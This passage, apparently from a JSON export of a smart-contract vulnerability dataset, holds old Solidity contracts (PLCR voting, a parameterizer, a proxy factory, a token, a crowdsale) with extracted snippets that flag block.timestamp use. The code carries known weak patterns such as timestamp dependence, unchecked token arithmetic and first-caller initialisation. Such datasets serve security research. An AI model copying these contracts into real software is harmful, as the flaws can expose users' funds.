{\n pollNonce = pollNonce + 1;\n uint commitEndDate = block.timestamp.add(_commitDuration);\n uint revealEndDate = commitEndDate.add(_revealDuration);\n pollMap[pollNonce] = Poll({\n voteQuorum: _voteQuorum,\n commitEndDate: commitEndDate,\n revealEndDate: revealEndDate,\n votesFor: 0,\n votesAgainst: 0\n });\n emit _PollCreated(_voteQuorum, commitEndDate, revealEndDate, pollNonce, msg.sender);\n return pollNonce;\n }\n function isPassed(uint _pollID) constant public returns (bool passed) {\n require(pollEnded(_pollID));\n Poll memory poll = pollMap[_pollID];\n return (100 * poll.votesFor) > (poll.voteQuorum * (poll.votesFor + poll.votesAgainst));\n }\n function getTotalNumberOfTokensForWinningOption(uint _pollID) constant public returns (uint numTokens) {\n require(pollEnded(_pollID));\n if (isPassed(_pollID))\n return pollMap[_pollID].votesFor;\n else\n return pollMap[_pollID].votesAgainst;\n }\n function pollEnded(uint _pollID) constant public returns (bool ended) {\n require(pollExists(_pollID));\n return isExpired(pollMap[_pollID].revealEndDate);\n }\n function commitPeriodActive(uint _pollID) constant public returns (bool active) {\n require(pollExists(_pollID));\n return !isExpired(pollMap[_pollID].commitEndDate);\n }\n function revealPeriodActive(uint _pollID) constant public returns (bool active) {\n require(pollExists(_pollID));\n return !isExpired(pollMap[_pollID].revealEndDate) && !commitPeriodActive(_pollID);\n }\n function didCommit(address _voter, uint _pollID) constant public returns (bool committed) {\n require(pollExists(_pollID));\n return pollMap[_pollID].didCommit[_voter];\n }\n function didReveal(address _voter, uint _pollID) constant public returns (bool revealed) {\n require(pollExists(_pollID));\n return pollMap[_pollID].didReveal[_voter];\n }\n function pollExists(uint _pollID) constant public returns (bool exists) {\n return (_pollID != 0 && _pollID <= pollNonce);\n }\n function getCommitHash(address _voter, uint _pollID) constant public returns (bytes32 commitHash) {\n return bytes32(store.getAttribute(attrUUID(_voter, _pollID), \"commitHash\"));\n }\n function getNumTokens(address _voter, uint _pollID) constant public returns (uint numTokens) {\n return store.getAttribute(attrUUID(_voter, _pollID), \"numTokens\");\n }\n function getLastNode(address _voter) constant public returns (uint pollID) {\n return dllMap[_voter].getPrev(0);\n }\n function getLockedTokens(address _voter) constant public returns (uint numTokens) {\n return getNumTokens(_voter, getLastNode(_voter));\n }\n function getInsertPointForNumTokens(address _voter, uint _numTokens, uint _pollID)\n constant public returns (uint prevNode) {\n uint nodeID = getLastNode(_voter);\n uint tokensInNode = getNumTokens(_voter, nodeID);\n while(nodeID != 0) {\n tokensInNode = getNumTokens(_voter, nodeID);\n if(tokensInNode <= _numTokens) {\n if(nodeID == _pollID) {\n nodeID = dllMap[_voter].getPrev(nodeID);\n }\n return nodeID;\n }\n nodeID = dllMap[_voter].getPrev(nodeID);\n }\n return nodeID;\n }\n function isExpired(uint _terminationDate) constant public returns (bool expired) {\n return (block.timestamp > _terminationDate);\n }\n function attrUUID(address _user, uint _pollID) public pure returns (bytes32 UUID) {\n return keccak256(_user, _pollID);\n }\n}\npragma solidity^0.4.11;\ncontract Parameterizer {\n event _ReparameterizationProposal(string name, uint value, bytes32 propID, uint deposit, uint appEndDate, address indexed proposer);\n event _NewChallenge(bytes32 indexed propID, uint challengeID, uint commitEndDate, uint revealEndDate, address indexed challenger);\n event _ProposalAccepted(bytes32 indexed propID, string name, uint value);\n event _ProposalExpired(bytes32 indexed propID);\n event _ChallengeSucceeded(bytes32 indexed propID, uint indexed challengeID, uint rewardPool, uint totalTokens);\n event _ChallengeFailed(bytes32 indexed propID, uint indexed challengeID, uint rewardPool, uint totalTokens);\n event _RewardClaimed(uint indexed challengeID, uint reward, address indexed voter);\n using SafeMath for uint;\n struct ParamProposal {\n uint appExpiry;\n uint challengeID;\n uint deposit;\n string name;\n address owner;\n uint processBy;\n uint value;\n }\n struct Challenge {\n uint rewardPool;\n address challenger;\n bool resolved;\n uint stake;\n uint winningTokens;\n mapping(address => bool) tokenClaims;\n }\n mapping(bytes32 => uint) public params;\n mapping(uint => Challenge) public challenges;\n mapping(bytes32 => ParamProposal) public proposals;\n EIP20Interface public token;\n PLCRVoting public voting;\n uint public PROCESSBY = 604800;\n function init(\n address _token,\n address _plcr,\n uint[] _parameters\n ) public {\n require(_token != 0 && address(token) == 0);\n require(_plcr != 0 && address(voting) == 0);\n token = EIP20Interface(_token);\n voting = PLCRVoting(_plcr);\n set(\"minDeposit\", _parameters[0]);\n set(\"pMinDeposit\", _parameters[1]);\n set(\"applyStageLen\", _parameters[2]);\n set(\"pApplyStageLen\", _parameters[3]);\n set(\"commitStageLen\", _parameters[4]);\n set(\"pCommitStageLen\", _parameters[5]);\n set(\"revealStageLen\", _parameters[6]);\n set(\"pRevealStageLen\", _parameters[7]);\n set(\"dispensationPct\", _parameters[8]);\n set(\"pDispensationPct\", _parameters[9]);\n set(\"voteQuorum\", _parameters[10]);\n set(\"pVoteQuorum\", _parameters[11]);\n }\n function proposeReparameterization(string _name, uint _value) public returns (bytes32) {\n uint deposit = get(\"pMinDeposit\");\n bytes32 propID = keccak256(_name, _value);\n if (keccak256(_name) == keccak256(\"dispensationPct\") ||\n keccak256(_name) == keccak256(\"pDispensationPct\")) {\n require(_value <= 100);\n }\n require(!propExists(propID));\n require(get(_name) != _value);\n proposals[propID] = ParamProposal({\n appExpiry: now.add(get(\"pApplyStageLen\")),\n challengeID: 0,\n deposit: deposit,\n name: _name,\n owner: msg.sender,\n processBy: now.add(get(\"pApplyStageLen\"))\n .add(get(\"pCommitStageLen\"))\n .add(get(\"pRevealStageLen\"))\n .add(PROCESSBY),\n value: _value\n });\n require(token.transferFrom(msg.sender, this, deposit));\n emit _ReparameterizationProposal(_name, _value, propID, deposit, proposals[propID].appExpiry, msg.sender);\n return propID;\n }\n function challengeReparameterization(bytes32 _propID) public returns (uint challengeID) {\n ParamProposal memory prop = proposals[_propID];\n uint deposit = prop.deposit;\n require(propExists(_propID) && prop.challengeID == 0);\n uint pollID = voting.startPoll(\n get(\"pVoteQuorum\"),\n get(\"pCommitStageLen\"),\n get(\"pRevealStageLen\")\n );\n challenges[pollID] = Challenge({\n challenger: msg.sender,\n rewardPool: SafeMath.sub(100, get(\"pDispensationPct\")).mul(deposit).div(100),\n stake: deposit,\n resolved: false,\n winningTokens: 0\n });\n proposals[_propID].challengeID = pollID;\n require(token.transferFrom(msg.sender, this, deposit));\n var (commitEndDate, revealEndDate,) = voting.pollMap(pollID);\n emit _NewChallenge(_propID, pollID, commitEndDate, revealEndDate, msg.sender);\n return pollID;\n }\n function processProposal(bytes32 _propID) public {\n ParamProposal storage prop = proposals[_propID];\n address propOwner = prop.owner;\n uint propDeposit = prop.deposit;\n if (canBeSet(_propID)) {\n set(prop.name, prop.value);\n emit _ProposalAccepted(_propID, prop.name, prop.value);\n delete proposals[_propID];\n require(token.transfer(propOwner, propDeposit));\n } else if (challengeCanBeResolved(_propID)) {\n resolveChallenge(_propID);\n } else if (now > prop.processBy) {\n emit _ProposalExpired(_propID);\n delete proposals[_propID];\n require(token.transfer(propOwner, propDeposit));\n } else {\n revert();\n }\n assert(get(\"dispensationPct\") <= 100);\n assert(get(\"pDispensationPct\") <= 100);\n now.add(get(\"pApplyStageLen\"))\n .add(get(\"pCommitStageLen\"))\n .add(get(\"pRevealStageLen\"))\n .add(PROCESSBY);\n delete proposals[_propID];\n }\n function claimReward(uint _challengeID, uint _salt) public {\n require(challenges[_challengeID].tokenClaims[msg.sender] == false);\n require(challenges[_challengeID].resolved == true);\n uint voterTokens = voting.getNumPassingTokens(msg.sender, _challengeID, _salt);\n uint reward = voterReward(msg.sender, _challengeID, _salt);\n challenges[_challengeID].winningTokens -= voterTokens;\n challenges[_challengeID].rewardPool -= reward;\n challenges[_challengeID].tokenClaims[msg.sender] = true;\n emit _RewardClaimed(_challengeID, reward, msg.sender);\n require(token.transfer(msg.sender, reward));\n }\n function claimRewards(uint[] _challengeIDs, uint[] _salts) public {\n require(_challengeIDs.length == _salts.length);\n for (uint i = 0; i < _challengeIDs.length; i++) {\n claimReward(_challengeIDs[i], _salts[i]);\n }\n }\n function voterReward(address _voter, uint _challengeID, uint _salt)\n public view returns (uint) {\n uint winningTokens = challenges[_challengeID].winningTokens;\n uint rewardPool = challenges[_challengeID].rewardPool;\n uint voterTokens = voting.getNumPassingTokens(_voter, _challengeID, _salt);\n return (voterTokens * rewardPool) / winningTokens;\n }\n function canBeSet(bytes32 _propID) view public returns (bool) {\n ParamProposal memory prop = proposals[_propID];\n return (now > prop.appExpiry && now < prop.processBy && prop.challengeID == 0);\n }\n function propExists(bytes32 _propID) view public returns (bool) {\n return proposals[_propID].processBy > 0;\n }\n function challengeCanBeResolved(bytes32 _propID) view public returns (bool) {\n ParamProposal memory prop = proposals[_propID];\n Challenge memory challenge = challenges[prop.challengeID];\n return (prop.challengeID > 0 && challenge.resolved == false && voting.pollEnded(prop.challengeID));\n }\n function challengeWinnerReward(uint _challengeID) public view returns (uint) {\n if(voting.getTotalNumberOfTokensForWinningOption(_challengeID) == 0) {\n return 2 * challenges[_challengeID].stake;\n }\n return (2 * challenges[_challengeID].stake) - challenges[_challengeID].rewardPool;\n }\n function get(string _name) public view returns (uint value) {\n return params[keccak256(_name)];\n }\n function tokenClaims(uint _challengeID, address _voter) public view returns (bool) {\n return challenges[_challengeID].tokenClaims[_voter];\n }\n function resolveChallenge(bytes32 _propID) private {\n ParamProposal memory prop = proposals[_propID];\n Challenge storage challenge = challenges[prop.challengeID];\n uint reward = challengeWinnerReward(prop.challengeID);\n challenge.winningTokens = voting.getTotalNumberOfTokensForWinningOption(prop.challengeID);\n challenge.resolved = true;\n if (voting.isPassed(prop.challengeID)) {\n if(prop.processBy > now) {\n set(prop.name, prop.value);\n }\n emit _ChallengeFailed(_propID, prop.challengeID, challenge.rewardPool, challenge.winningTokens);\n require(token.transfer(prop.owner, reward));\n }\n else {\n emit _ChallengeSucceeded(_propID, prop.challengeID, challenge.rewardPool, challenge.winningTokens);\n require(token.transfer(challenges[prop.challengeID].challenger, reward));\n }\n }\n function set(string _name, uint _value) private {\n params[keccak256(_name)] = _value;\n }\n}\npragma solidity ^0.4.19;\ncontract ProxyFactory {\n event ProxyDeployed(address proxyAddress, address targetAddress);\n event ProxiesDeployed(address[] proxyAddresses, address targetAddress);\n function createManyProxies(uint256 _count, address _target, bytes _data)\n public\n {\n address[] memory proxyAddresses = new address[](_count);\n for (uint256 i = 0; i < _count; ++i) {\n proxyAddresses[i] = createProxyImpl(_target, _data);\n }\n ProxiesDeployed(proxyAddresses, _target);\n }\n function createProxy(address _target, bytes _data)\n public\n returns (address proxyContract)\n {\n proxyContract = createProxyImpl(_target, _data);\n ProxyDeployed(proxyContract, _target);\n }\n function createProxyImpl(address _target, bytes _data)\n internal\n returns (address proxyContract)\n {\n assembly {\n let contractCode := mload(0x40)\n mstore(add(contractCode, 0x0b), _target)\n mstore(sub(contractCode, 0x09), 0x000000000000000000603160008181600b9039f3600080808080368092803773)\n mstore(add(contractCode, 0x2b), 0x5af43d828181803e808314602f57f35bfd000000000000000000000000000000)\n proxyContract := create(0, contractCode, 60)\n if iszero(extcodesize(proxyContract)) {\n revert(0, 0)\n }\n let dataLength := mload(_data)\n if iszero(iszero(dataLength)) {\n if iszero(call(gas, proxyContract, 0, add(_data, 0x20), dataLength, 0, 0)) {\n revert(0, 0)\n }\n }\n }\n }\n}\npragma solidity ^0.4.8;\ncontract EIP20 is EIP20Interface {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n string public name;\n uint8 public decimals;\n string public symbol;\n function EIP20(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) view public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n view public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract PLCRFactory {\n event newPLCR(address creator, EIP20 token, PLCRVoting plcr);\n ProxyFactory public proxyFactory;\n PLCRVoting public canonizedPLCR;\n constructor() {\n canonizedPLCR = new PLCRVoting();\n proxyFactory = new ProxyFactory();\n }\n function newPLCRBYOToken(EIP20 _token) public returns (PLCRVoting) {\n PLCRVoting plcr = PLCRVoting(proxyFactory.createProxy(canonizedPLCR, \"\"));\n plcr.init(_token);\n emit newPLCR(msg.sender, _token, plcr);\n return plcr;\n }\n function newPLCRWithToken(\n uint _supply,\n string _name,\n uint8 _decimals,\n string _symbol\n ) public returns (PLCRVoting) {\n EIP20 token = new EIP20(_supply, _name, _decimals, _symbol);\n token.transfer(msg.sender, _supply);\n PLCRVoting plcr = PLCRVoting(proxyFactory.createProxy(canonizedPLCR, \"\"));\n plcr.init(token);\n emit newPLCR(msg.sender, token, plcr);\n return plcr;\n }\n}\ncontract ParameterizerFactory {\n event NewParameterizer(address creator, address token, address plcr, Parameterizer parameterizer);\n PLCRFactory public plcrFactory;\n ProxyFactory public proxyFactory;\n Parameterizer public canonizedParameterizer;\n constructor(PLCRFactory _plcrFactory) public {\n plcrFactory = _plcrFactory;\n proxyFactory = plcrFactory.proxyFactory();\n canonizedParameterizer = new Parameterizer();\n }\n function newParameterizerBYOToken(\n EIP20 _token,\n uint[] _parameters\n ) public returns (Parameterizer) {\n PLCRVoting plcr = plcrFactory.newPLCRBYOToken(_token);\n Parameterizer parameterizer = Parameterizer(proxyFactory.createProxy(canonizedParameterizer, \"\"));\n parameterizer.init(\n _token,\n plcr,\n _parameters\n );\n emit NewParameterizer(msg.sender, _token, plcr, parameterizer);\n return parameterizer;\n }\n function newParameterizerWithToken(\n uint _supply,\n string _name,\n uint8 _decimals,\n string _symbol,\n uint[] _parameters\n ) public returns (Parameterizer) {\n PLCRVoting plcr = plcrFactory.newPLCRWithToken(_supply, _name, _decimals, _symbol);\n EIP20 token = EIP20(plcr.token());\n token.transfer(msg.sender, _supply);\n Parameterizer parameterizer = Parameterizer(proxyFactory.createProxy(canonizedParameterizer, \"\"));\n parameterizer.init(\n token,\n plcr,\n _parameters\n );\n emit NewParameterizer(msg.sender, token, plcr, parameterizer);\n return parameterizer;\n }\n}",
  "extract_feature": [
    "function startPoll(uint _voteQuorum, uint _commitDuration, uint _revealDuration) public returns (uint pollID) {\npollNonce = pollNonce + 1;\nuint commitEndDate = block.timestamp.add(_commitDuration);\nuint revealEndDate = commitEndDate.add(_revealDuration);\npollMap[pollNonce] = Poll({\nvoteQuorum: _voteQuorum,\ncommitEndDate: commitEndDate,\nrevealEndDate: revealEndDate,\nvotesFor: 0,\nvotesAgainst: 0\n});\nemit _PollCreated(_voteQuorum, commitEndDate, revealEndDate, pollNonce, msg.sender);\nreturn pollNonce;\n}",
    "function isExpired(uint _terminationDate) constant public returns (bool expired) {\nreturn (block.timestamp > _terminationDate);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f9f"
  },
  "filename": "9858.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n 